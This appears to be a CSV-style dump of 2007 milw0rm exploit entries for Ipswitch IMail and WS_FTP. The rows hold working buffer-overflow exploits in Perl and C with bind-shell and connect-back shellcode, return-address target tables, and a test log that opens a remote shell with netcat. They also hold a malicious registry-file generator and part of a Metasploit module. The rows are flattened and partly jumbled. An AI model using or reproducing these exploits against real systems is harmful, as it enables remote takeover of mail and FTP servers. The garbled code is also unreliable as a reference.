#  00418D09  |.  8D4D AC       |LEA ECX,DWORD PTR SS:[EBP-54]           ; |
#  00418D0C  |.  51            |PUSH ECX                                ; |dest
#  00418D0D  |.  E8 7E610100   |CALL <JMP.&MSVCR71.strcpy>              ; \strcpy
#  00418D12  |.  83C4 08       |ADD ESP,8
#  The programmer has made an extreamly stupid mistake.
#  He checks the arg's first byte, if it is 0x22( "" ),then invoke strcpy,
#  else strncpy.
#  the buffer overflow takes place when the strcpy is called.
#  But the strncpy is also vulnerable,because it just likes this: strncpy(dest, src, strlen(src));
#  So, whether the command was started with a '""' or not, the stack overflow will take place immediately.
#  Multiple SEARCH COMMAND is vulnerable,in this case, we use ""SEARCH ON"".
#  But others like ""SEARCH BEFORE"" command will also trigger the overflow.
#  NOTES: To trigger the Vuln, there must be at least one mail in the mailbox!!
#  Badchar is: 0x00 0x0a 0x0d 0x0b 0x09 0x0c 0x20
# Tested On Windows 2003 SP1 CN
#  D:\>perl imap.pl 192.168.226.128 143
#  * OK IMAP4 Server (IMail 9.10)
#  0 OK LOGIN completed
#  * FLAGS (\Answered \Flagged \Deleted \Seen \Draft)
#  * 1 EXISTS
#  * 1 RECENT
#  * OK [UIDVALIDITY 1185337300] UIDs valid
#  * OK [UIDNEXT 485337302] Predicted next UID
#  2 OK [READ-WRITE] SELECT completed
#  -------------- [BEGIN] -------------------
#  ----------------  [END]  ------------------
#  D:\>nc -vv -n 192.168.226.128 1154
#  (UNKNOWN) [192.168.226.128] 1154 (?) open
#  Microsoft Windows [Â°Ã¦Â±Â¾ 5.2.3790]
#  (C) Â°Ã¦ÃˆÂ¨Ã‹Ã¹Ã“Ã 1985-2003 Microsoft Corp.
#  C:\WINDOWS\system32>
#Target IP
# win32_bind -  EXITFUNC=thread LPORT=1154 Size=344 Encoder=Pex http://metasploit.com
# login
# select
# search
# milw0rm.com [2007-07-25]","use strict;
use warnings;
use IO::Socket;
my $host = shift ;
my $port = shift ;
my $account = ""void"";
my $password = ""ph4nt0m.org"";
my $pad1 = ""void[at]ph4nt0m.org_"" x 4 . ""ph4nt0m"";
my $pad2 = 'void[at]pstgroup';
my $jmpesp = ""\x12\x45\xfa\x7f""; # Windows 2000/xp/2003 Universal
my $shellcode =
""\x29\xc9\x83\xe9\xb0\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e\xb6"".
""\x78\xf8\x75\x83\xee\xfc\xe2\xf4\x4a\x12\x13\x38\x5e\x81\x07\x8a"".
""\x49\x18\x73\x19\x92\x5c\x73\x30\x8a\xf3\x84\x70\xce\x79\x17\xfe"".
""\xf9\x60\x73\x2a\x96\x79\x13\x3c\x3d\x4c\x73\x74\x58\x49\x38\xec"".
""\x1a\xfc\x38\x01\xb1\xb9\x32\x78\xb7\xba\x13\x81\x8d\x2c\xdc\x5d"".
""\xc3\x9d\x73\x2a\x92\x79\x13\x13\x3d\x74\xb3\xfe\xe9\x64\xf9\x9e"".
""\xb5\x54\x73\xfc\xda\x5c\xe4\x14\x75\x49\x23\x11\x3d\x3b\xc8\xfe"".
""\xf6\x74\x73\x05\xaa\xd5\x73\x35\xbe\x26\x90\xfb\xf8\x76\x14\x25"".
""\x49\xae\x9e\x26\xd0\x10\xcb\x47\xde\x0f\x8b\x47\xe9\x2c\x07\xa5"".
""\xde\xb3\x15\x89\x8d\x28\x07\xa3\xe9\xf1\x1d\x13\x37\x95\xf0\x77"".
""\xe3\x12\xfa\x8a\x66\x10\x21\x7c\x43\xd5\xaf\x8a\x60\x2b\xab\x26"".
""\xe5\x2b\xbb\x26\xf5\x2b\x07\xa5\xd0\x10\xfc\xf7\xd0\x2b\x71\x94"".
""\x23\x10\x5c\x6f\xc6\xbf\xaf\x8a\x60\x12\xe8\x24\xe3\x87\x28\x1d"".
""\x12\xd5\xd6\x9c\xe1\x87\x2e\x26\xe3\x87\x28\x1d\x53\x31\x7e\x3c"".
""\xe1\x87\x2e\x25\xe2\x2c\xad\x8a\x66\xeb\x90\x92\xcf\xbe\x81\x22"".
""\x49\xae\xad\x8a\x66\x1e\x92\x11\xd0\x10\x9b\x18\x3f\x9d\x92\x25"".
""\xef\x51\x34\xfc\x51\x12\xbc\xfc\x54\x49\x38\x86\x1c\x86\xba\x58"".
""\x48\x3a\xd4\xe6\x3b\x02\xc0\xde\x1d\xd3\x90\x07\x48\xcb\xee\x8a"".
""\xc3\x3c\x07\xa3\xed\x2f\xaa\x24\xe7\x29\x92\x74\xe7\x29\xad\x24"".
""\x49\xa8\x90\xd8\x6f\x7d\x36\x26\x49\xae\x92\x8a\x49\x4f\x07\xa5"".
""\x3d\x2f\x04\xf6\x72\x1c\x07\xa3\xe4\x87\x28\x1d\x59\xb6\x18\x15"".
""\xe5\x87\x2e\x8a\x66\x78\xf8\x75"";
my $sock = IO::Socket::INET->new( PeerHost=>$host, PeerPort=>$port, proto=>""tcp"" ) || die ""Connect error.\n"";
my $res = <$sock>;
print $res;
if( $res !~ /OK/ )
exit(-1);
print $sock ""0 LOGIN $account $password\r\n"";
print $res = <$sock>;
if( $res !~ /0 OK/ )
exit(-1);
print $sock ""1 SELECT INBOX\r\n"";
while(1)
print $res = <$sock>;
if($res =~ /1 OK/)
{last; }
elsif($res =~ /1 NO/ || $res =~ /BAD/)
{ exit(-1); }
else
{next; }
my $payload = $pad1.$jmpesp.$pad2.$shellcode;
print $sock ""2 SEARCH ON <$payload>\r\n"";
$sock->close();"
2007-04-02,Local,Windows,Marsu,Ipswitch WS_FTP 5.05,Server Manager Local Site Buffer Overflow,"#include ""stdio.h""
#include ""stdlib.h""
/* win32_exec -  EXITFUNC=process CMD=calc.exe Size=165 Encoder=PexFnstenvSub http://metasploit.com */
// milw0rm.com [2007-04-02]","*      Ipswitch WS_FTP 5.05 Server Manager Local Site Buffer Overflow       *
*                                                                           *
*                                                                           *
* There's a buffer overflow in iftpmgr.exe that can be triggered by         *
* registering a long site command. The result is then saved in the registry *
* and every time the group is checked the bug appears.                      *
* This exploit launches calc.exe.                                           *
*                                                                           *
* Tested against Win XP SP2 FR.                                             *
* Have Fun!                                                                 *
*                                                                           *
* Coded and discovered by Marsu <Marsupilamipowa@hotmail.fr>                *
unsigned char CalcShellcode[] =
""\x29\xc9\x83\xe9\xdd\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x26""
""\x45\x32\xe3\x83\xeb\xfc\xe2\xf4\xda\xad\x76\xe3\x26\x45\xb9\xa6""
""\x1a\xce\x4e\xe6\x5e\x44\xdd\x68\x69\x5d\xb9\xbc\x06\x44\xd9\xaa""
""\xad\x71\xb9\xe2\xc8\x74\xf2\x7a\x8a\xc1\xf2\x97\x21\x84\xf8\xee""
""\x27\x87\xd9\x17\x1d\x11\x16\xe7\x53\xa0\xb9\xbc\x02\x44\xd9\x85""
""\xad\x49\x79\x68\x79\x59\x33\x08\xad\x59\xb9\xe2\xcd\xcc\x6e\xc7""
""\x5C\x22\x86\x03\x23\x42\xce\x72\xd3\xa3\x85\x4a\xef\xad\x05\x3e""
""\x68\x56\x59\x9f\x68\x4e\x4d\xd9\xea\xad\xc5\x82\xe3\x26\x45\xb9""
""\x8b\x1a\x1a\x03\x15\x46\x13\xbb\x1b\xa5\x85\x49\xb3\x4e\x3b\xea""
""\x01\x55\x2d\xaa\x1d\xac\x4b\x65\x1c\xc1\x26\x53\x8f\x45\x6b\x57""
""\x9b\x43\x45\x32\xe3"";
int main(int argc, char* argv[])
FILE* regfile;
char evilbuff[250];
printf(""[+] Ipswitch WS_FTP 5.05 Server Manager Local Site Buffer Overflow\n"");
printf(""[+] Coded and discovered by Marsu <Marsupilamipowa@hotmail.fr>\n"");
if (argc!=3) {
printf(""[+] Usage: %s <Group> <file.reg>\n"",argv[0]);
printf(""[+] ex:    %s Marsu Pilami.reg\n"",argv[0]);
return 0;
memset(evilbuff,'C',250);
memcpy(evilbuff+4,CalcShellcode,strlen(CalcShellcode));
memcpy(evilbuff+202,""\x46\xE4\xBD\x7C"",4);/*00 50 00 00 in Shell32.dll. We need this to jump back to our shellcode =)
CALL DWORD PTR DS:[EDX+90] and our code is at 0x00500040 in DS*/
memset(evilbuff+215,0,1);
regfile=fopen(argv[2],""wb"");
fprintf(regfile,""Windows Registry Editor Version 5.00\r\n\r\n"");
fprintf(regfile,""[HKEY_LOCAL_MACHINE\\SOFTWARE\\Ipswitch\\iFtpSvc\\Domains\\%s\\Commands]\r\n\r\n"",argv[1]);
fprintf(regfile,""[HKEY_LOCAL_MACHINE\\SOFTWARE\\Ipswitch\\iFtpSvc\\Domains\\%s\\Commands\\aa]\r\n\""_Executable\""=\""%s\""\r\n"",argv[1],evilbuff);
fprintf(regfile,""\""_Arguments\""=\""%s\""\r\n"",evilbuff);
fprintf(regfile,""\""*everyone\""=dword:000000ff\r\n\r\n"");
fclose(regfile);
printf(""[+] Done. Have fun!\n"");
return 0;"
2007-04-01,Remote,Windows,Heretic2,IPSwitch IMail Server 8.20,IMAPD Remote Buffer Overflow,"/* Dreatica-FXP crew
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#pragma comment(lib,""ws2_32"")
// ###################################################
// # XGetopt.h  Version 1.2
// ###################################################
// ##################################################
// address to data segment in Mailbox
/* win32_bind -  EXITFUNC=seh LPORT=4444 Size=344 Encoder=PexFnstenvSub http://metasploit.com */
/* thx to the one who wrote it, taken from kcope exploit */
// jump to our shellcode
// set defaults
// ------------
// prepare shellcode
// -----------------
// init buffer
// write shellcode
// set EIP
// add jump back
// -----------
// ###################################################
// # XGetopt.h  Version 1.2
// ###################################################
// ###################################################
// milw0rm.com [2007-04-01]","* ----------------------------------------
* Target         : Ipswitch IMAIL Server IMAPD 7.13 - 8.20 exploit
* Site           : http://www.ipswitch.com
* Found by       : iDEFENSE Security (http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=243)
* ----------------------------------------
* Exploit date   : 31.03.2007
* Exploit writer : Heretic2 (heretic2x@gmail.com)
* OS             : Windows 2000 SP4 and Windows XP ALL
* Crew           : Dreatica-FXP
* ----------------------------------------
* Info: Well, this is the realization of the IMAIL IMAPd 'LOGIN' buffer overflow vulnerability.
*   The version provided by kcope uses SEH overwrite method, which doesn't work on Windows XP SP2,
*   so i have written the exploit that overwrites EIP and then execute the shellcode.
*   I have tested this exploit on the all versions of Imail from 7.13 to 8.20, versions < 7.13 are also vulnerable,
*   but i don't have them to test the exploit, Windows 2000 SP4 and Windows XP SP0-SP2.
*   Here you need to select the OS and the IMAIL version, that is not good, but anyone with some brain can
*   easily modify the code to get version of Imail from banner or obtain 'data segment' value without knowing
*   the Imail version.
* ----------------------------------------
* Thanks to:
*       iDEFENSE Security           ( http://labs.idefense.com/
*       The Metasploit project      ( http://metasploit.com                            )
*       kcope                       ( <kingcope [at] gmx.net>                          )
*       Dreatica-FXP crew           (                                                  )
* ----------------------------------------
* This was written for educational purpose only. Use it at your own risk. Author will be not be
* responsible for any damage, caused by that code.
void usage(char * s);
void help(char * s);
void logo();
SOCKET do_connect (char *remotehost, int port);
void prepare_shellcode(unsigned char * fsh, int sh, char * cbip, int cbport);
void make_buffer(unsigned char * buf, int itarget, int sh, char * cbip, int cbport, int ifix);
int send_buffer(SOCKET sa, char * buf, char * remotehost, int port);
int validate_args(int port, int sh, int itarget, int fix);
extern int optind, opterr;
extern char *optarg;
int getopt(int argc, char *argv[], char *optstring);
struct _target{
const char *t ;
unsigned long ret ;
} targets[] =
{// jmp esp
{""Windows 2000 SP4 ENG           [ shell32.dll ]"",   0x7850d3bf },
{""Windows XP SP0 ENG             [  ntdll.dll  ]"",   0x77f439e3 },
{""Windows XP SP0 RUS             [  ntdll.dll  ]"",   0x77f5801c },
{""Windows XP SP1 ENG             [  ntdll.dll  ]"",   0x77fa59cc },
{""Windows XP SP1 RUS             [  ntdll.dll  ]"",   0x77fb59cc },
{""Windows XP SP2 ENG             [  ntdll.dll  ]"",   0x7C941eed },
{""Windows XP SP2 RUS             [  ntdll.dll  ]"",   0x7C941eed },
{""Windows XP SP2 RUS(no patches) [ shell32.dll ]"",   0x7C82385D },
{NULL,                                               0x00000000 }
struct _imail{
const char * name ;
unsigned long fix;
}imailfix[] =
{""Ipswitch IMAIL Server IMAPD 7.04 - 8.05HF3"", 0x10034000},
{""Ipswitch IMAIL Server IMAPD 8.10 - 8.11   "", 0x1002f000},
{""Ipswitch IMAIL Server IMAPD 8.12 - 8.20   "", 0x10031000},
{NULL,                                         0x00000000}
struct _shellcode{
const char * name;
char * shellcode;
} shellcodes[]={ // bad charachters: 0x00 0x03 0x0A 0x0C 0x22 0x5C      (and more)
{""Spawn bindshell on port 4444"",
""\x29\xc9\x83\xe9\xb0\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x63""
""\xb4\x7d\x58\x83\xeb\xfc\xe2\xf4\x9f\xde\x96\x15\x8b\x4d\x82\xa7""
""\x9c\xd4\xf6\x34\x47\x90\xf6\x1d\x5f\x3f\x01\x5d\x1b\xb5\x92\xd3""
""\x2c\xac\xf6\x07\x43\xb5\x96\x11\xe8\x80\xf6\x59\x8d\x85\xbd\xc1""
""\xcf\x30\xbd\x2c\x64\x75\xb7\x55\x62\x76\x96\xac\x58\xe0\x59\x70""
""\x16\x51\xf6\x07\x47\xb5\x96\x3e\xe8\xb8\x36\xd3\x3c\xa8\x7c\xb3""
""\x60\x98\xf6\xd1\x0f\x90\x61\x39\xa0\x85\xa6\x3c\xe8\xf7\x4d\xd3""
""\x23\xb8\xf6\x28\x7f\x19\xf6\x18\x6b\xea\x15\xd6\x2d\xba\x91\x08""
""\x9c\x62\x1b\x0b\x05\xdc\x4e\x6a\x0b\xc3\x0e\x6a\x3c\xe0\x82\x88""
""\x0b\x7f\x90\xa4\x58\xe4\x82\x8e\x3c\x3d\x98\x3e\xe2\x59\x75\x5a""
""\x36\xde\x7f\xa7\xb3\xdc\xa4\x51\x96\x19\x2a\xa7\xb5\xe7\x2e\x0b""
""\x30\xe7\x3e\x0b\x20\xe7\x82\x88\x05\xdc\x6c\x04\x05\xe7\xf4\xb9""
""\xf6\xdc\xd9\x42\x13\x73\x2a\xa7\xb5\xde\x6d\x09\x36\x4b\xad\x30""
""\xc7\x19\x53\xb1\x34\x4b\xab\x0b\x36\x4b\xad\x30\x86\xfd\xfb\x11""
""\x34\x4b\xab\x08\x37\xe0\x28\xa7\xb3\x27\x15\xbf\x1a\x72\x04\x0f""
""\x9c\x62\x28\xa7\xb3\xd2\x17\x3c\x05\xdc\x1e\x35\xea\x51\x17\x08""
""\x3a\x9d\xb1\xd1\x84\xde\x39\xd1\x81\x85\xbd\xab\xc9\x4a\x3f\x75""
""\x9d\xf6\x51\xcb\xee\xce\x45\xf3\xc8\x1f\x15\x2a\x9d\x07\x6b\xa7""
""\x16\xf0\x82\x8e\x38\xe3\x2f\x09\x32\xe5\x17\x59\x32\xe5\x28\x09""
""\x9c\x64\x15\xf5\xba\xb1\xb3\x0b\x9c\x62\x17\xa7\x9c\x83\x82\x88""
""\xe8\xe3\x81\xdb\xa7\xd0\x82\x8e\x31\x4b\xad\x30\x93\x3e\x79\x07""
""\x30\x4b\xab\xa7\xb3\xb4\x7d\x58""
{""ConnectBack shell (set the  CBIP and CBPort)"",
""\xEB\x10\x5B\x4B\x33\xC9\x66\xB9\x25\x01\x80\x34\x0B\xC2\xE2\xFA""
""\xEB\x05\xE8\xEB\xFF\xFF\xFF""
""\x2B\x39\xC2\xC2\xC2\x9D\xA6\x63\xF2\xC2\xC2\xC2\x49\x82\xCE\x49""
""\xB2\xDE\x6F\x49\xAA\xCA\x49\x35\xA8\xC6\x9B\x2A\x59\xC2\xC2\xC2""
""\x20\x3B\xAA\xF1\xF0\xC2\xC2\xAA\xB5\xB1\xF0\x9D\x96\x3D\xD4\x49""
""\x2A\xA8\xC6\x9B\x2A\x40\xC2\xC2\xC2\x20\x3B\x43\x2E\x52\xC3\xC2""
""\xC2\x96\xAA\xC3\xC3\xC2\xC2\x3D\x94\xD2\x92\x92\x92\x92\x82\x92""
""\x82\x92\x3D\x94\xD6\x49\x1A\xAA\xBD\xC2\xC2\xC3\xAA\xC0\xC2\xC2""
""\xF7\x49\x0E\xA8\xD2\x93\x91\x3D\x94\xDA\x47\x02\xB7\x88\xAA\xA1""
""\xAF\xA6\xC2\x4B\xA4\xF2\x41\x2E\x96\x4F\xFE\xE6\xA8\xD7\x9B\x69""
""\x20\x3F\x04\x86\xE6\xD2\x86\x3C\x86\xE6\xFF\x4B\x9E\xE6\x8A\x4B""
""\x9E\xE6\x8E\x4B\x9E\xE6\x92\x4F\x86\xE6\xD2\x96\x92\x93\x93\x93""
""\xA8\xC3\x93\x93\x3D\xB4\xF2\x93\x3D\x94\xC6\x49\x0E\xA8\x3D\x3D""
""\xF3\x3D\x94\xCA\x91\x3D\x94\xDE\x3D\x94\xCE\x93\x94\x49\x87\xFE""
""\x49\x96\xEA\xBA\xC1\x17\x90\x49\xB0\xE2\xC1\x37\xF1\x0B\x8B\x83""
""\x6F\xC1\x07\xF1\x19\xCD\x7C\xD2\xF8\x14\xB6\xCA\x03\x09\xCF\xC1""
""\x18\x82\x29\x33\xF9\xDD\xB7\x25\x98\x49\x98\xE6\xC1\x1F\xA4\x49""
""\xCE\x89\x49\x98\xDE\xC1\x1F\x49\xC6\x49\xC1\x07\x69\x9C\x9B\x01""
""\x2A\xC2\x3D\x3D\x3D\x4C\x8C\xCC\x2E\xB0\x3C\x71\xD4\x6F\x1B\xC7""
""\x0C\xBC\x1A\x20\xB1\x09\x2F\x3E\xF9\x1B\xCB\x37\x6F\x2E\x3B\x68""
""\xA2\x25\xBB\x04\xBB""
{NULL , NULL }
unsigned char jmpcode[] = ""\x8B\xc4\x66\x2D\xEC\x01\x66\x81\xec\xf0\x02\xFF\xE0"";
int main(int argc, char **argv)
char * remotehost=NULL, * cbip=NULL;
char def_cbip[]=""127.0.0.1"";
char temp1[100], temp2[100];
int cbport, port, itarget=0, sh=0, fix=0;
SOCKET s;
char c;
logo();
WSADATA wsa;
WSAStartup(MAKEWORD(2,0), &wsa);
if(argc<2)
usage(argv[0]);
WSACleanup();
return -1;
cbport=4444;
port=143;
while((c = getopt(argc, argv, ""h:p:s:t:I:P:f:""))!= EOF)
switch (c)
case 'h':
remotehost=optarg;
break;
case 's':
sscanf(optarg, ""%d"", &sh);
sh--;
break;
case 't':
sscanf(optarg, ""%d"", &itarget);
itarget--;
break;
case 'f':
sscanf(optarg, ""%d"", &fix);
fix--;
break;
case 'p':
sscanf(optarg, ""%d"", &port);
break;
case 'P':
sscanf(optarg, ""%d"", &cbport);
break;
case 'I':
cbip=optarg;
break;
default:
usage(argv[0]);
return -1;
if(remotehost==NULL)
usage(argv[0]);
WSACleanup();
return -1;
if((sh==1)&&(cbip==NULL)) cbip = def_cbip ;
if(validate_args(port, sh, itarget, fix)==-1) return -1;
memset(temp1,0,sizeof(temp1));
memset(temp2,0,sizeof(temp2));
memset(temp1, '\x20' , 58 - strlen(remotehost) -1);
printf("" #  Host    : %s%s# \n"", remotehost, temp1);
sprintf(temp2, ""%d"", port);
memset(temp1,0,sizeof(temp1));
memset(temp1, '\x20' , 58 - strlen(temp2) -1);
printf("" #  Port    : %s%s# \n"", temp2, temp1);
memset(temp1,0,sizeof(temp1));
memset(temp2,0,sizeof(temp2));
sprintf(temp2, ""%s"", shellcodes[sh].name );
memset(temp1, '\x20' , 58 - strlen(temp2) -1);
printf("" #  Shellcde: %s%s# \n"", temp2, temp1);
memset(temp1,0,sizeof(temp1));
memset(temp1, '\x20' , 58 - strlen(targets[itarget].t) -1);
printf("" #  Target  : %s%s# \n"", targets[itarget].t, temp1);
if(sh==1)
memset(temp1,0,sizeof(temp1));
memset(temp1, '\x20' , 58 - strlen(cbip) -1);
printf("" #  CB IP   : %s%s# \n"", cbip, temp1);
sprintf(temp2, ""%d"", cbport);
memset(temp1,0,sizeof(temp1));
memset(temp1, '\x20' , 58 - strlen(temp2) -1);
printf("" #  CB port : %s%s# \n"", temp2, temp1);
printf("" # ------------------------------------------------------------------- # \n"");
printf(""[+] Checking if server is online... "");
fflush(stdout);
s=do_connect(remotehost, port);
if(s==-1)
fprintf(stdout, ""failed\n"");
return 0;
closesocket(s);
printf(""SUCCESS!\n"");
char buf[1000];
memset(buf,0,sizeof(buf));
printf(""[+] Constructing attacking buffer... "");
fflush(stdout);
make_buffer((unsigned char *)buf,itarget,sh,cbip,cbport,fix);
printf(""done\n"");
SOCKET sa;
sa=do_connect(remotehost, port);
if(sa==-1)
fprintf(stdout, ""[-] Connection failed to server %s\n"", remotehost);
return -1;
printf(""[+] Sending %d bytes of buffer to server\n"", strlen(buf));
if(send_buffer(sa, buf,remotehost,port)==0)
fprintf(stdout, ""[-] Cannot send the buffer to server %s\n"", remotehost);
return -1;
printf(""[+] Buffer sent\n"");
closesocket(sa);
if(sh==0)
printf(""[+] Connect to %s:%d\n"", remotehost, 7915);
}else
printf(""[+] The shell should arrive to %s:%d"", cbip, cbport);
WSACleanup();
return 0;
int validate_args(int port, int sh, int itarget, int fix)
int i=0,x=0;
for(i=0;shellcodes[i].name;i++)if(i==sh)x=1;
if(x==0)
printf(""[-] The shellcode number is invalid\n"");
return -1;
x=0;
for(i=0;targets[i].t;i++)if(i==itarget)x=1;
if(x==0)
printf(""[-] The target is invalid\n"");
return -1;
x=0;
for(i=0;imailfix[i].name;i++)if(i==fix)x=1;
if(x==0)
printf(""[-] The imail version is invalid\n"");
return -1;
if(port<=0)
printf(""[-] The port is invalid\n"");
return -1;
return 1;
SOCKET do_connect (char *remotehost, int port)
static struct hostent *host;
static struct sockaddr_in addr;
static int done=0;
SOCKET s;
if (done != 1)
host = gethostbyname(remotehost);
if (!host)
perror(""[-] gethostbyname() failed"");
return -1;
addr.sin_addr = *(struct in_addr*)host->h_addr;
s = socket(PF_INET, SOCK_STREAM, 0);
if (s == -1)
closesocket(s);
perror(""socket() failed"");
return -1;
addr.sin_port = htons(port);
addr.sin_family = AF_INET;
if (connect(s, (struct sockaddr*)&addr, sizeof(addr)) == -1)
closesocket(s);
return -1;
done=1;
return s;
void prepare_shellcode(unsigned char * fsh, int sh, char * cbip, int cbport)
memcpy(fsh, shellcodes[sh].shellcode, strlen(shellcodes[sh].shellcode));
if(sh==1)
static struct hostent *host = gethostbyname(cbip);
static struct sockaddr_in addr;
addr.sin_addr = *(struct in_addr*)host->h_addr;
fsh[111] = (addr.sin_addr.S_un.S_un_b.s_b1) ^ 0xc2;
fsh[112] = (addr.sin_addr.S_un.S_un_b.s_b2) ^ 0xc2;
fsh[113] = (addr.sin_addr.S_un.S_un_b.s_b3) ^ 0xc2;
fsh[114] = (addr.sin_addr.S_un.S_un_b.s_b4) ^ 0xc2;
fsh[118] = ((cbport >> 8) & 0xff) ^ 0xc2;
fsh[119] = ((cbport     ) & 0xff) ^ 0xc2;
void make_buffer(unsigned char * buf, int itarget, int sh, char * cbip, int cbport, int ifix)
unsigned char * fsh;
fsh = (unsigned char *) malloc ((strlen(shellcodes[sh].shellcode)+1) );
memset(fsh, 0, (strlen(shellcodes[sh].shellcode)+1));
prepare_shellcode(fsh, sh, cbip, cbport);
memset(buf,0,sizeof(buf));
unsigned char * cp = buf;
*cp++ = '@';
*cp++ = '\x90';
*cp++ = '\x90';
*cp++ = '\x90';
*cp++ = '\x90';
memcpy(cp, fsh, strlen((char *)fsh)  );
cp+=strlen((char *)cp);
memset(cp, 'A', 488-strlen((char *)fsh));
cp+=strlen((char *)cp);
*cp++ = (unsigned char)((targets[itarget].ret      ) & 0xff);
*cp++ = (unsigned char)((targets[itarget].ret >>  8) & 0xff);
*cp++ = (unsigned char)((targets[itarget].ret >> 16) & 0xff);
*cp++ = (unsigned char)((targets[itarget].ret >> 24) & 0xff);
*cp++ = '\x41';
*cp++ = '\x41';
*cp++ = '\x41';
*cp++ = '\xeb';
*cp++ = '\x03';
*cp++ = (unsigned char)((imailfix[ifix].fix >>  8) & 0xff);
*cp++ = (unsigned char)((imailfix[ifix].fix >> 16) & 0xff);
*cp++ = (unsigned char)((imailfix[ifix].fix >> 24) & 0xff);
memcpy(cp, jmpcode, strlen((char *)jmpcode));
int send_buffer(SOCKET s, char * buf, char * remotehost, int port)
char bufmax[1024];
recv(s, bufmax, sizeof(bufmax),0);
char sendbuf[1000];
memset(sendbuf, 0, sizeof(sendbuf));
strcat(sendbuf, ""a001 LOGIN \"""");
strcat(sendbuf, buf);
strcat(sendbuf, ""\"" password\r\n"");
int sentbytes=send(s, sendbuf, (int)strlen(sendbuf),0);
if(sentbytes<(int)strlen(sendbuf)) return 0;
return 1;
void usage(char * s)
printf("" Usage: %s -h <host> [-p <port>] [-s <shellcode>] [-t <target>] [-f <imail>] [-I <cb IP>] [-P <cb port>]\n\n"", s);
printf("" ----------------------------------------------------------------------- \n"");
printf("" Arguments:\n"");
printf(""    -h host to connect                      \n"");
printf(""    -p port             (default: 143      )\n"");
printf(""    -s shellcode        (default: 1        )\n"");
printf(""    -t target           (default: 1        )\n"");
printf(""    -f Imail version    (default: 1        )\n"");
printf(""    -I connect back IP  (default: 127.0.0.1)\n"");
printf(""    -P connect back port(default: 4444     )\n"");
printf(""\n"");
printf(""    Shellcodes:\n"");
for(int i=0; shellcodes[i].name!=0;i++)
printf(""         %d. %s\n"",i+1,shellcodes[i].name);
printf(""\n"");
printf(""    Targets:\n\n"");
int j;
for(j=0; targets[j].t!=0;j++)
printf(""         %d. %s\n"",j+1,targets[j].t);
printf(""\n"");
printf(""    Imail version:\n\n"");
for(j=0; imailfix[j].name!=0;j++)
printf(""         %d. %s\n"",j+1,imailfix[j].name);
printf(""\n"");
printf("" ----------------------------------------------------------------------- \n"");
char*optarg;// global argument pointer
intoptind = 0; // global argv index
int getopt(int argc, char *argv[], char *optstring)
static char *next = NULL;
if (optind == 0)
next = NULL;
optarg = NULL;
if (next == NULL || *next == '\0')
if (optind == 0)
optind++;
if (optind >= argc || argv[optind][0] != '-' || argv[optind][1] == '\0')
optarg = NULL;
if (optind < argc)
optarg = argv[optind];
return EOF;
if (strcmp(argv[optind], ""--"") == 0)
optind++;
optarg = NULL;
if (optind < argc)
optarg = argv[optind];
return EOF;
next = argv[optind];
next++;// skip past -
optind++;
char c = *next++;
char *cp = strchr(optstring, c);
if (cp == NULL || c == ':')
return '?';
cp++;
if (*cp == ':')
if (*next != '\0')
optarg = next;
next = NULL;
else if (optind < argc)
optarg = argv[optind];
optind++;
else
return '?';
return c;
void logo()
printf("" ####################################################################### \n"");
printf("" #     ____                 __  _                  ______  __    _____ #\n"");
printf("" #    / __ \\________  _____/ /_(_)_________       / __/\\ \\/ /   / _  / #\n"");
printf("" #   / / / / ___/ _ \\/ __ / __/ / ___/ __ / ___  / /    \\  /   / // /  #\n"");
printf("" #  / /_/ / / /  ___/ /_// /_/ / /__/ /_// /__/ / _/    /  \\  / ___/   #\n"");
printf("" # /_____/_/  \\___/ \\_,_/\\__/_/\\___/\\__,_/     /_/     /_/\\_\\/_/       #\n"");
printf("" #                                 crew                                #\n"");
printf("" ####################################################################### \n"");
printf("" #  Exploit : Ipswitch IMAIL Server IMAPD 7.13 - 8.20 exploit          # \n"");
printf("" #  Version : 1.0                                                      # \n"");
printf("" #  System  : Windows 2000 SP4, Windows XP ALL                         # \n"");
printf("" #  Date    : 31.03.2007                                               # \n"");
printf("" # ------------------------------------------------------------------- # \n"");"
2007-02-19,Remote,Windows,Jacopo Cervini,Ipswitch WS_FTP Server 5.05,XMD5 Remote Buffer Overflow (Metasploit),"# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
# milw0rm.com [2007-02-19]","package Msf::Exploit::wsftp_server_505_xmd5;
use base ""Msf::Exploit"";
use strict;
use Pex::Text;
my $advanced = { };
my $info =
'Name'    => 'WS-FTP Server 5.05 XMD5 Overflow',
'Version' => '$Revision: 1.0 $',
'Authors' =>
[ 'Jacopo Cervini <acaro [at] jervus.it>',
'Arch'  => [ 'x86' ],
'OS'    => [ 'win32', 'win2000', 'winxp', 'win2003' ],
'Priv'  => 0,
'AutoOpts'  => { 'EXITFUNC' => 'thread' },
'UserOpts'  =>
'RHOST' => [1, 'ADDR', 'The target address'],
'RPORT' => [1, 'PORT', 'The target port', 21],
'SSL'   => [0, 'BOOL', 'Use SSL'],
'USER'  => [1, 'DATA', 'Username', 'ftp'],
'PASS'  => [1, 'DATA', 'Password', 'ftp'],
'Payload' =>
'Space'  => 329,
'BadChars'  => ""\x00\x7e\x2b\x26\x3d\x25\x3a\x22\x0a\x0d\x20\x2f\x5c\x2e"",
'Keys' => ['+ws2ord'],
'Description'  =>  Pex::Text::Freeform(qq{
This module exploits the buffer overflow found in the XMD command
in IPSWITCH WS_FTP Server 5.05.
'Refs'  =>
['BID', '20076'],
[ 'CVE', '2006-4847' ],
'DefaultTarget' => 0,
'Targets' =>
['WS-FTP Server 5.05 Universal', 0x1002e636 ],# push esp, ret in LIBEAY32.dll
'Keys' => ['wsftp'],
'DisclosureDate' => 'Sep 14 2006',
sub new {
my $class = shift;
my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
return($self);
sub Exploit {
my $self = shift;
my $target_host = $self->GetVar('RHOST');
my $target_port = $self->GetVar('RPORT');
my $target_idx  = $self->GetVar('TARGET');
my $shellcode   = $self->GetVar('EncodedPayload')->Payload;
my $target      = $self->Targets->[$target_idx];
if (! $self->InitNops(128)) {
$self->PrintLine(""[*] Failed to initialize the NOP module."");
return;
my $request = Pex::Text::PatternCreate(676);
$request .= pack(""V"", $target->[1]);
